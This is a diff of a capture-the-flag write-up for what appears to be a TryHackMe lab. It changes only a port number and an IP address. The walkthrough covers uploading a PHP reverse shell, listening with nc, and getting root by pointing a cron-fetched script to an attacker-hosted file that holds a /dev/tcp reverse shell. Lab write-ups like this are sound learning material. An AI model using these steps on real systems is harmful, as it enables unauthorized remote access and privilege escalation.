@@ -8,7 +8,7 @@ After searching for public exploits and finding nothing useful, I decided to try
 
 I immediately checked the file upload functionality. At first, only .txt and .xml files were allowed. I tested uploading different extensions using ffuf, but the real breakthrough was finding a setting that let me change the allowed file types. I added .php, generated a reverse shell using revshells.com, pointing it to my IP and port, and uploaded it.
 
-I opened a listener in my terminal with nc -nvlp 1234. Then I navigated to the uploaded PHP file in the browser, and boom—I got a shell back to my machine!
+I opened a listener in my terminal with nc -nvlp 9001. Then I navigated to the uploaded PHP file in the browser, and boom—I got a shell back to my machine!
 
 After stabilizing the shell, I ran whoami and confirmed I was the www-data user. I looked into the /home directory and found two users: mario and toad. To go further, I needed their credentials.
 
@@ -20,7 +20,7 @@ Still stuck, I ran LinEnum again—this time as toad. I discovered an environmen
 
 But I still needed root. After trying various approaches, I uploaded pspy64 to watch running processes. I noticed that every minute, a script named counter.sh was downloaded from a domain mkingdom.thm. That was my chance!
 
-I edited /etc/hosts to point mkingdom.thm to my own IP. I hosted a fake counter.sh using Python's HTTP server on port 85. The script contained a simple reverse shell like sh -i >& /dev/tcp/10.10.80.222/9001 0>&1. I opened a listener with nc -nvlp 9001 and waited. One minute later—I got a shell. This time, as root.
+I edited /etc/hosts to point mkingdom.thm to my own IP. I hosted a fake counter.sh using Python's HTTP server on port 85. The script contained a simple reverse shell like sh -i >& /dev/tcp/10.10.202.107/9001 0>&1. I opened a listener with nc -nvlp 9001 and waited. One minute later—I got a shell. This time, as root.
 
 I confirmed it with whoami, then navigated to /root and read the root.txt flag — mission complete.
 
